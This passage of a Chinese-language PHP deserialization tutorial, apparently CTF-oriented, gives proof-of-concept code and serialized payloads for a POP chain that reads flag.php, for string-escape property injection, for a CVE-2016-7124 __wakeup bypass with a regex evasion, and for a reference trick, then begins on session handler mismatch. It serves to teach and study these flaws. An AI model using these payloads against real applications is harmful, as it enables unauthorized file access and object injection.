class="comment">//        $this-&gt;p = array();</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//if(isset($_GET[&#x27;pop&#x27;]))&#123;</span></span><br><span class="line"><span class="comment">//    unserialize($_GET[&#x27;pop&#x27;]);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$mod</span> = <span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;p = <span class="variable">$mod</span>;</span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$show</span>-&gt;source = <span class="variable">$show</span>;</span><br><span class="line"><span class="variable">$show</span>-&gt;str = <span class="variable">$test</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$show</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//注意var是private，Modifiervar的%00记得加。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload：</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Show&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;source&quot;</span>;r:<span class="number">1</span>;s:<span class="number">3</span>:<span class="string">&quot;str&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;p&quot;</span>;O:<span class="number">8</span>:<span class="string">&quot;Modifier&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">13</span>:<span class="string">&quot;%00Modifier%00var&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="0x08-字符串逃逸"><a href="#0x08-字符串逃逸" class="headerlink" title="0x08 字符串逃逸"></a>0x08 字符串逃逸</h1><ul>
<li>反序列化以<code>;&#125;</code>结束，后面的字符串不影响正常的反序列化。</li>
<li>属性逃逸：</li>
</ul>
<p>​	一般数据先经过一次<code>serialize()</code>后再经过<code>unserialize()</code>，在这个中间反序列化的<strong>字符串变多</strong>或者<strong>变少</strong>的时候才有可能存在反序列化<strong>属性逃逸</strong>。</p>
<h2 id="字符串逃逸—减少"><a href="#字符串逃逸—减少" class="headerlink" title="字符串逃逸—减少"></a>字符串逃逸—减少</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span> = <span class="string">&quot;abcsystem()&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>());</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;system()&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输出结果：</span></span><br><span class="line"><span class="comment">string(59) &quot;O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:11:&quot;abcsystem()&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;&quot;</span></span><br><span class="line"><span class="comment">string(51) &quot;O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:11:&quot;abc&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;&quot;</span></span><br><span class="line"><span class="comment">bool(false)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">分析：</span></span><br><span class="line"><span class="comment">利用str_replace()函数，将system()替换为空后，破坏了字符串，识别11位变成了abc&quot;;s:2:&quot;v。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>目标：构造出<code>v3=123</code>逃逸。</li>
<li>修改<code>v2</code>的值来补全格式</li>
</ul>
<p>​	最开始破坏的字符：</p>
<p>​	O:1:”A”:2:{s:2:”v1”;s:11:”<strong>abc”;s:2:”v</strong>2”;s:3:”123”;}</p>
<p>​	通过修改字符串补全格式，并使后面的字符串变成功能性代码：</p>
<p>​	O:1:”A”:2:{s:2:”v1”;s:<strong>?:”abc”;s:2:”v2”;s:xx:”</strong><code>;s:2:&quot;v3&quot;;s:3:&quot;123&quot;;&#125;</code></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">需要被吃掉的字符  abc&quot;;s:2:&quot;v2&quot;;s:xx:  共19个</span><br><span class="line">1个system()有8个字符  共需要3个system()</span><br><span class="line">一共吃掉abc+3个system()有27个字符</span><br><span class="line">多出8个字符，所以需要在v2中在补充8个字符,即7个字符+一个引号&quot;.</span><br></pre></td></tr></table></figure></div>

<ul>
<li>poc：</li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span> = <span class="string">&quot;abcsystem()system()system()&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span> = <span class="string">&#x27;1234567&quot;;s:2:&quot;v3&quot;;s:3:&quot;123&quot;;&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>());</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;system()&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输出结果：</span></span><br><span class="line"><span class="comment">string(102) &quot;O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:27:&quot;abcsystem()system()system()&quot;;s:2:&quot;v2&quot;;s:29:&quot;1234567&quot;;s:2:&quot;v3&quot;;s:3:&quot;123&quot;;&#125;&quot;;&#125;&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">string(78) &quot;O:1:&quot;A&quot;:2:</span></span><br><span class="line"><span class="comment">&#123;s:2:&quot;v1&quot;;s:27:&quot;abc&quot;;s:2:&quot;v2&quot;;s:29:&quot;1234567&quot;;s:2:&quot;v3&quot;;s:3:&quot;123&quot;;&#125;&quot;;&#125;&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">object(A)#1 (3) &#123;</span></span><br><span class="line"><span class="comment">  [&quot;v1&quot;]=&gt;</span></span><br><span class="line"><span class="comment">  string(27) &quot;abc&quot;;s:2:&quot;v2&quot;;s:29:&quot;1234567&quot;</span></span><br><span class="line"><span class="comment">  [&quot;v2&quot;]=&gt;</span></span><br><span class="line"><span class="comment">  string(29) &quot;1234567&quot;;s:2:&quot;v3&quot;;s:3:&quot;123&quot;;&#125;&quot;</span></span><br><span class="line"><span class="comment">  [&quot;v3&quot;]=&gt;</span></span><br><span class="line"><span class="comment">  string(3) &quot;123&quot;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">注：v2是从类中直接调用的。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<h2 id="字符串逃逸—增加"><a href="#字符串逃逸—增加" class="headerlink" title="字符串逃逸—增加"></a>字符串逃逸—增加</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span> = <span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> =  <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>());</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;pwd&quot;</span>,<span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输出结果：</span></span><br><span class="line"><span class="comment">string(49) &quot;O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:2:&quot;ls&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;&quot;</span></span><br><span class="line"><span class="comment">string(50) &quot;O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:2:&quot;pwd&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;&quot;</span></span><br><span class="line"><span class="comment">bool(false)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">分析：</span></span><br><span class="line"><span class="comment">利用str_replace()函数，将ls替换为pwd后，增加了以1位字符，破坏了字符串，识别2位变成了pw，挤出末尾的d字符。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li><p>目标：构造出<code>v3=123</code>逃逸</p>
</li>
<li><p>修改<code>v1</code>的值来补全格式</p>
</li>
</ul>
<p>最开始破坏的字符</p>
<p>O:1:”A”:2:{s:2:”v1”;s:2:”pw<strong>d</strong>“;s:2:”v2”;s:3:”123”;}</p>
<p>通过修改字符串补全格式，并使后面的字符串变成功能性代码：</p>
<p>O:1:”A”:2:{s:2:”v1”;s:2:”pw<strong>d</strong><code>&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;</code>s:2:”v2”;s:3:”123”;}</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">增加的字符 &quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125; 共22位</span><br><span class="line">一个ls转换成pwd多出来1位字符，所以需要22个ls转换成pwd</span><br></pre></td></tr></table></figure></div>

<ul>
<li>poc</li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span> = <span class="string">&#x27;lslslslslslslslslslslslslslslslslslslslslsls&quot;;s:2:&quot;v3&quot;;s:3:&quot;123&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> =  <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>());</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;pwd&quot;</span>,<span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输出结果：</span></span><br><span class="line"><span class="comment">string(114) &quot;O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:66:&quot;lslslslslslslslslslslslslslslslslslslslslsls&quot;;s:2:&quot;v3&quot;;s:3:&quot;123&quot;;&#125;&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;&quot;</span></span><br><span class="line"><span class="comment">string(136) &quot;O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:66:&quot;pwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwd&quot;;s:2:&quot;v3&quot;;s:3:&quot;123&quot;;&#125;&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;&quot;</span></span><br><span class="line"><span class="comment">object(A)#1 (3) &#123;</span></span><br><span class="line"><span class="comment">  [&quot;v1&quot;]=&gt;</span></span><br><span class="line"><span class="comment">  string(66) &quot;pwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwd&quot;</span></span><br><span class="line"><span class="comment">  [&quot;v2&quot;]=&gt;</span></span><br><span class="line"><span class="comment">  string(3) &quot;123&quot;</span></span><br><span class="line"><span class="comment">  [&quot;v3&quot;]=&gt;</span></span><br><span class="line"><span class="comment">  string(3) &quot;123&quot;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">注：v2是直接从类中获取。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<h1 id="0x09-weakup-绕过"><a href="#0x09-weakup-绕过" class="headerlink" title="0x09 _weakup()绕过"></a>0x09 _weakup()绕过</h1><ul>
<li>反序列化漏洞：CVE-2016-7124</li>
<li>php5 &lt; php5.6.25</li>
<li>php7 &lt; php7.0.10</li>
</ul>
<h2 id="漏洞产生原因"><a href="#漏洞产生原因" class="headerlink" title="漏洞产生原因"></a>漏洞产生原因</h2><p>当序列化字符串中表示对象<strong>属性个数</strong>的值大于真是的属性个数时，会跳过**_weakup()**的执行。</p>
<p>eg：</p>
<p>O:1:”A”:<strong>2</strong>:{s:2:”v1”;s:2:”kk”;s:2:”v2”;s:3:”123”;}</p>
<p>O:1:”A”:<strong>3</strong>:{s:2:”v1”;s:2:”kk”;s:2:”v2”;s:3:”123”;}</p>
<h2 id="weakup-绕过例题"><a href="#weakup-绕过例题" class="headerlink" title="_weakup()绕过例题"></a>_weakup()绕过例题</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class secret&#123;</span><br><span class="line">    var $file=&#x27;index.php&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __construct($file)&#123;</span><br><span class="line">        $this-&gt;file=$file;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        include_once($this-&gt;file);</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;file=&#x27;index.php&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">if (!isset($cmd))&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    if (preg_match(&#x27;/[oc]:\d+:/i&#x27;,$cmd))&#123;</span><br><span class="line">        echo &quot;Are you daydreaming?&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        unserialize($cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//sercet in flag.php</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>目标：触发<code>echo</code>，调用<code>$flag</code></li>
<li>第一步 ：触发<code>destruct()</code>**(在对象的所有引用被删除或者当对象被显式销毁时触发)**，并使<code>$file=flag.php</code></li>
<li>第二步：初步得到   <code>O:6:&quot;secret&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></li>
<li>第三步：将<strong>属性个数</strong><code>1</code>改为<code>2</code>，绕过<code>weakup()</code></li>
<li>第四步：由于正则<code>preg_match(&#39;/[oc]:\d+:/i&#39;,$cmd)</code>，所以在<code>o:</code>后不能有数字，可以在数字前添加<code>+</code>并<code>url</code>编码绕过</li>
<li>poc如下：</li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> <span class="variable">$file</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="comment">//    var $file=&#x27;index.php&#x27;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//    public function __construct($file)&#123;</span></span><br><span class="line"><span class="comment">//        $this-&gt;file=$file;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment">//        include_once($this-&gt;file);</span></span><br><span class="line"><span class="comment">//        echo $flag;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    function __wakeup()&#123;</span></span><br><span class="line"><span class="comment">//        $this-&gt;file=&#x27;index.php&#x27;;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$cmd=$_GET[&#x27;cmd&#x27;];</span></span><br><span class="line"><span class="comment">//if (!isset($cmd))&#123;</span></span><br><span class="line"><span class="comment">//    highlight_file(__FILE__);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//else&#123;</span></span><br><span class="line"><span class="comment">//    if (preg_match(&#x27;/[oc]:\d+:/i&#x27;,$cmd))&#123;</span></span><br><span class="line"><span class="comment">//        echo &quot;Are you daydreaming?&quot;;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//    else&#123;</span></span><br><span class="line"><span class="comment">//        unserialize($cmd);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">secret</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//sercet in flag.php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">O:%<span class="number">2</span>B6:<span class="string">&quot;secret&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="0x10-序列化引用"><a href="#0x10-序列化引用" class="headerlink" title="0x10 序列化引用"></a>0x10 序列化引用</h1><h2 id="序列化引用例题"><a href="#序列化引用例题" class="headerlink" title="序列化引用例题"></a>序列化引用例题</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">just4fun</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$enter</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$secret</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line">    <span class="variable">$pass</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="variable">$pass</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$pass</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$o</span>) &#123;</span><br><span class="line">    <span class="variable">$o</span>-&gt;secret = <span class="string">&quot;*&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$o</span>-&gt;secret === <span class="variable">$o</span>-&gt;enter)</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Congratulation! Here is my secret: &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh no... You can&#x27;t fool me&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;are you trolling?&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>目标：让<code>$enter</code>等于<code>$secret</code>的值</li>
<li>第一步：<code>$pass=str_replace(&#39;*&#39;,&#39;\*&#39;,$pass)</code>，过滤了<code>*</code>，选择引用**&amp;**的方式。</li>
<li>第二步：构造序列化字符串，让<code>$enter</code>引用**&amp;**<code>$secret</code>的值</li>
<li>poc如下：</li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">just4fun</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$enter</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$secret</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//if (isset($_GET[&#x27;pass&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">//    $pass = $_GET[&#x27;pass&#x27;];</span></span><br><span class="line"><span class="comment">//    $pass=str_replace(&#x27;*&#x27;,&#x27;\*&#x27;,$pass);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//$o = unserialize($pass);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//if ($o) &#123;</span></span><br><span class="line"><span class="comment">//    $o-&gt;secret = &quot;*&quot;;</span></span><br><span class="line"><span class="comment">//    if ($o-&gt;secret === $o-&gt;enter)</span></span><br><span class="line"><span class="comment">//        echo &quot;Congratulation! Here is my secret: &quot;.$flag;</span></span><br><span class="line"><span class="comment">//    else</span></span><br><span class="line"><span class="comment">//        echo &quot;Oh no... You can&#x27;t fool me&quot;;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//else echo &quot;are you trolling?&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$just4fun</span> = <span class="keyword">new</span> <span class="title function_ invoke__">just4fun</span>();</span><br><span class="line"><span class="variable">$just4fun</span>-&gt;enter = &amp;<span class="variable">$just4fun</span>-&gt;secret;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$just4fun</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">payload：</span><br><span class="line">O:<span class="number">8</span>:<span class="string">&quot;just4fun&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;enter&quot;</span>;N;s:<span class="number">6</span>:<span class="string">&quot;secret&quot;</span>;R:<span class="number">2</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">注：</span></span><br><span class="line"><span class="comment">R 代表引用，2 代表enter</span></span><br><span class="line"><span class="comment">secret值和enter值一样</span></span><br><span class="line"><span class="comment">secret值发生变化则enter的值同样发生变化</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<h1 id="0x11-Session反序列化"><a href="#0x11-Session反序列化" class="headerlink" title="0x11 Session反序列化"></a>0x11 Session反序列化</h1><ul>
<li>当<code>session_start()</code>被调用或者<code>php.ini</code>中的<code>session.auto_start</code>为<strong>1</strong>时，PHP内部调用会话管理器，访问用户session被序列化以后，存储到指定目录**(&#x2F;tmp)**。</li>
<li>漏洞产生：<strong>写入格式和读取格式不一致</strong></li>
<li>存储数据的格式有多种，常用的有三种</li>
</ul>
<h2 id="存储格式"><a href="#存储格式" class="headerlink" title="存储格式"></a>存储格式</h2><table>
<thead>
<tr>
<th>处理器</th>
<th>对应的存储格式</th>
</tr>
</thead>
<tbody><tr>
<td>php</td>
<td>键名+竖线+经过serialize()函数序列化处理的值</td>
</tr>
<tr>
<td>php_serialize(php&gt;&#x3D;5.5.4)</td>
<td>经过serialize()函数序列化处理的数组</td>
</tr>
<tr>
<td>php_binary</td>
<td>键名的长度对应的ASCII字符+键名s+经过serialize()函数反序列化处理的值</td>
</tr>
</tbody></table>
<h2 id="session-php格式"><a href="#session-php格式" class="headerlink" title="session-php格式"></a>session-php格式</h2><ul>
<li>默认情况下用<code>php</code>格式存储</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;benben&#x27;] = $_GET[&#x27;ben&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>浏览器输入</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ben=dazhuang</span><br></pre></td></tr></table></figure></div>

<ul>
<li>得到</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">benben|s:8:&quot;dazhuang&quot;;</span><br></pre></td></tr></table></figure></div>

<h2 id="session-php-serialize格式"><a href="#session-php-serialize格式" class="headerlink" title="session-php_serialize格式"></a>session-php_serialize格式</h2><ul>
<li>需声明session存储格式为<code>php_serialize</code></li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;benben&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;ben&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;b&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>浏览器输入</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ben=dadzhuang&amp;b=666</span><br></pre></td></tr></table></figure></div>

<ul>
<li>得到</li>
</ul>
